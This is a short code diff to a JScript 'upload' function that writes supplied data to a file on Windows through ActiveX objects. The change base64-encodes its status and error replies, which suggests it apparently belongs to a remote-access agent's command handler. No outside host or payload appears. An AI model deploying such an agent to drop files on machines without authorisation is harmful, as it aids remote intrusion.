@@ -2,7 +2,7 @@ function upload(data, path) {
     try {
         fs = new ActiveXObject("Scripting.FileSystemObject")
         if (fs.FileExists(path) == true) {
-            return 'File already exists.';
+            return b64e('File already exists.');
         }
         var stream = new ActiveXObject("ADODB.Stream");
         stream.Open();
@@ -11,8 +11,8 @@ function upload(data, path) {
         stream.Position = 0;
         stream.SaveToFile(path, 2);
         stream.Close();
-        return 'Successfully uploaded file.';
+        return b64e('Successfully uploaded file.');
     } catch (e) {
-        return e.message;
+        return b64e(e.message);
     }
 }
